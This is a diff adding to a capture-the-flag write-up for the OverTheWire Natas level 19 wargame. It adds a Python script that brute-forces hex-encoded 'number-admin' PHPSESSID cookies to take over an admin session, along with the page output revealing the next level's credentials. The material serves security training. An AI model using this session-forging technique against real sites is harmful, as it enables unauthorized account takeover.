@@ -1055,13 +1055,46 @@ https://overthewire.org/wargames/natas/natas17.html
 > URL:      http://natas19.natas.labs.overthewire.org
 
 ```python
+import natasX
 
+natas = natasX
+
+#print(natas.natasX(19, "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs", endpoint="index.php", data={"debug": "", "username": "admin", "password": "123"}).cookies.get("PHPSESSID"))
+
+for i in range(280, 282):
+    charHex = f'{str(i).encode("utf-8").hex()}2d61646d696e'
+    print(charHex)
+    print(natas.natasX(19, "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs", endpoint="index.php",
+                       data={"debug": "", "username": "admin", "password": ""}, cookies={"PHPSESSID": charHex}).text)
 ```
 
 **Output**
 
 ```html
 
+3238312d61646d696e
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas19", "pass": "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs" };</script></head>
+<body>
+<h1>natas19</h1>
+<div id="content">
+<p>
+<b>
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+</b>
+</p>
+DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas20
+Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
+</body>
+</html>
 ```
 
 <br>
